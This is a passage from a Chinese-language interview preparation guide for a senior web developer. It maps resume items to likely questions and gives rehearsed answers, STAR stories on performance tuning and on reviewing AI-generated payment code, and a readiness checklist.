Spring Boot微服务 ───────→ "Java Spring Cloud处理核心结算"
```

### 凌动SaaS（架构升级）→ 8个必考点

```
React迁移Next.js ────────→ "从传统React迁移至Next.js 15"
微前端（Module Federation）→ "Module Federation实现微前端架构"
状态管理（Zustand）─────→ "Zustand替代Redux，代码量减少40%"
CI/CD流水线 ─────────────→ "GitHub Actions自动化部署体系"
性能优化（70%体积）─────→ "产物体积减小70%，首屏加载提升50%"
WebSocket替代轮询 ───────→ "WebSocket实现实时监控，降低负载40%"
大文件上传 ──────────────→ "Web Worker分片上传，支持G级数据"
团队建设 ────────────────→ "培养3名初级开发成长为独立负责人"
```

### AI协同开发（差异化）→ 5个必考点

```
Cursor使用经验 ──────────→ "使用Cursor进行快速原型开发"
AI代码审查 ──────────────→ "识别并修复幂等性处理漏洞"
防御性思维 ──────────────→ "12年沉淀的防御性思维"
AI局限性 ────────────────→ "AI无法模拟的防御性思维"
混合开发模式 ────────────→ "AI辅助 + 人工决策"
```

---

## 💡 围绕简历的面试话术模板

### 模板1：技术选型问题

**面试官问**："为什么选择Next.js而不是传统React？"

**满分回答（围绕OmniSettlement项目）**：
> "在OmniSettlement项目中，我需要实现首屏600ms的性能指标。传统React是CSR（客户端渲染），首屏会白屏，用户体验差。
> 
> Next.js的App Router支持Server Components，可以在服务端预取数据，首屏直接渲染完整内容。我用Server Actions实现前后端一体化开发，一个文件里写UI和业务逻辑，开发效率提升50%。
> 
> 最终通过代码分割、动态导入、ISR增量生成，将首屏优化到600ms，Lighthouse性能评分达95+。"

### 模板2：性能优化问题

**面试官问**："说一个你做过的性能优化案例。"

**满分回答（围绕光大银行项目）**：
> "在光大银行项目中，有个核心查询接口响应时间达到3秒，严重影响用户体验。
> 
> 我通过慢查询日志分析，发现是千万级社保流水表的全表扫描导致的。我做了三个优化：
> 1. 索引重构：在查询条件字段上建立联合索引
> 2. 分区表：按月份分区，减少扫描数据量
> 3. 读写分离：查询走从库，减轻主库压力
> 
> 最终响应时间从3秒优化到200ms，性能提升15倍。"

### 模板3：AI协同开发问题

**面试官问**："你如何使用AI辅助开发？"

**满分回答（围绕所有项目）**：
> "我在3个生产级项目中都使用了Cursor进行AI辅助开发，开发效率提升了3-5倍。
> 
> 但我的核心价值不是'用AI写得快'，而是'用12年经验审得准'。举个例子：在OmniSettlement项目中，AI生成的资金转账代码看起来很完美，但我立即发现了三个致命漏洞：
> 1. 没有数据库事务，可能导致扣款成功但入账失败
> 2. 没有幂等性控制，用户网络抖动连点两次会扣两次钱
> 3. 没有余额检查，可能导致透支
> 
> 这种'防御性思维'是我12年金融经验的核心价值，也是AI目前难以模拟的。我的工作模式是：AI辅助 + 人工决策，用AI提升80%的开发效率，用12年经验保证100%的系统安全性。"

---

## 📝 围绕简历的3个STAR故事（必背）

### 故事1：OmniSettlement首屏600ms优化

**Situation（背景）**：
> "在OmniSettlement项目中，我负责实时数据看板。需求是首屏加载时间不能超过600ms，同时要支持WebSocket实时推送。"

**Task（任务）**：
> "难点在于：既要保证SSR的首屏性能，又要保证WebSocket的实时性。如果用传统CSR，首屏会白屏；如果用传统SSR，服务端渲染的价格和客户端WebSocket推送的价格不一致，会导致Hydration Error。"

**Action（行动）**：
> "我的解决方案是：
> 1. 首屏用SSR渲染骨架屏，不渲染实时价格，避免水合错误
> 2. 客户端挂载后，立即建立WebSocket连接，订阅价格推送
> 3. 用React的Suspense包裹实时数据组件，实现Streaming渲染
> 4. 通过代码分割、动态导入、图片优化(next/image)、ISR增量生成优化性能
> 5. 在Next.js配置中，对静态资源开启强缓存，对动态数据用协商缓存"

**Result（结果）**：
> "上线后，首屏加载时间稳定在500-600ms，实时推送延迟在30-50ms，Lighthouse性能评分达95+。用户反馈体验非常流畅。这个方案后来被团队推广到其他实时看板项目。"

---

### 故事2：光大银行SQL优化15倍

**Situation（背景）**：
> "在光大银行项目中，有个核心查询接口响应时间达到3秒，用户投诉系统太慢。"

**Task（任务）**：
> "需要在不改变业务逻辑的情况下，将响应时间优化到200ms以内。"

**Action（行动）**：
> "我通过慢查询日志分析，发现是千万级社保流水表的全表扫描导致的。我做了三个优化：
> 1. 索引重构：在查询条件字段（user_id + create_time）上建立联合索引
> 2. 分区表：按月份分区，将千万级数据拆分成12个百万级分区
> 3. 读写分离：查询走从库，减轻主库压力
> 4. 增加Redis缓存：热点数据缓存5分钟"

**Result（结果）**：
> "响应时间从3秒优化到200ms，性能提升15倍。系统稳定运行，支撑日均百万级交易量，用户投诉降为零。"

---

### 故事3：AI代码审查发现幂等性漏洞

**Situation（背景）**：
> "在OmniSettlement项目中，我用Cursor生成资金转账接口代码。"

**Task（任务）**：
> "需要保证金融级的安全性和幂等性。"

**Action（行动）**：
> "AI生成的代码看起来很完美，但我在代码审查时发现了三个致命漏洞：
> 1. 没有数据库事务：扣款和入账不是原子操作，可能导致扣款成功但入账失败
> 2. 没有幂等性控制：用户网络抖动连点两次，会扣两次钱
> 3. 没有余额检查：可能导致账户透支
> 
> 我手动补充了防御逻辑：
> 1. 用Prisma的$transaction包裹整个转账流程
> 2. 引入idempotencyKey，检查是否已执行
> 3. 在扣款前检查余额，使用行级锁防止并发问题"

**Result（结果）**：
> "避免了重复扣款的生产事故，代码通过了安全审计。这个案例让我深刻理解：AI能提升效率，但金融级安全需要人工决策。"

---

## ✅ 围绕简历的面试检查清单

### 技术准备（必须流畅讲述）
- [ ] 能用STAR法则讲述"OmniSettlement首屏600ms优化"（15分钟）
- [ ] 能用STAR法则讲述"光大银行SQL优化15倍"（15分钟）
- [ ] 能用STAR法则讲述"AI代码审查幂等性漏洞"（15分钟）
- [ ] 能画出OmniSettlement完整技术架构图
- [ ] 能画出光大银行分布式事务TCC流程图
- [ ] 能画出凌动SaaS微前端架构图
- [ ] 能讲述Next.js 15 App Router vs Pages Router差异
- [ ] 能讲述Server Components vs Client Components差异
- [ ] 能讲述WebSocket vs HTTP差异
- [ ] 能讲述Zustand vs Redux差异

### 简历准备（必须对应）
- [ ] 每个必考点都能对应到简历中的具体项目
- [ ] 每个项目都能讲述3个以上的技术亮点
- [ ] 每个技术亮点都能用STAR法则展开
- [ ] 准备好简历中所有数字的来源（600ms、200ms、70%、50%等）

### 心态准备
- [ ] 自信：12年经验 + AI协同 = 降维打击
- [ ] 谦虚：承认不足，展示学习能力
